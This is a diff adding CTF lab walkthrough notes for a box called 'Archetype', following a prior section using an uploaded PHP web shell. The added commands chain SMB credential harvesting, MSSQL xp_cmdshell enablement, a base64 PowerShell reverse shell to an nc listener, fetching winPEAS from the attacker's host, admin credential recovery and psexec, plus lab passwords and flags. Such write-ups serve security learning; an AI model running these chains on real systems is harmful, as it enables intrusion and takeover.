@@ -111,3 +111,43 @@ aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
 http://thetoppers.htb/shell.php?cmd=ls
 http://thetoppers.htb/shell.php?cmd=cat%20../flag.txt
 ```
+
+## Archetype
+
+```shell
+sudo nmap -A <ip_address>
+smbclient -L <ip_address>
+smbclient //<ip_address>/backups
+get prod.dtsConfig
+User:sql_svc
+Password: M3g4c0rp123
+Hostname: ARCHETYPE
+sudo apt-get install pipx
+python3 -m pipx install impacket
+# https://github.com/fortra/impacket/tree/master
+mssqlclient.py ARCHETYPE/sql_svc:'M3g4c0rp123'@<ip_address> -windows-auth
+help
+EXEC sp_configure 'show advanced options', 1
+RECONFIGURE
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+xp_cmdshell whoami
+https://www.revshells.com/ (Powershell #3 base64)
+xp_cmdshell powershell -e <base_64_code>
+nc -lvnp 9001 (Host machine)
+cd C:\Users\sql_svc\Desktop
+type user.txt
+# user flag: 3e7b102e78218e935bf3f4951fec21a3
+mkdir peas
+cd peas
+wget https://github.com/peass-ng/PEASS-ng/releases/download/20260422-9567fd62/winPEASx64.exe (On local machine)
+python3 -m http.server (on local machine)
+wget http://<ip_host>/winPEASx64.exe -outfile winPEASx64.exe
+.\winPEASx64.exe
+type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
+psexec.py administrator@<ip_address>
+cd C:\Users\Administrator\Destop
+type root.txt
+#root flag: b91ccec3305e98240082d4474b848528
+```
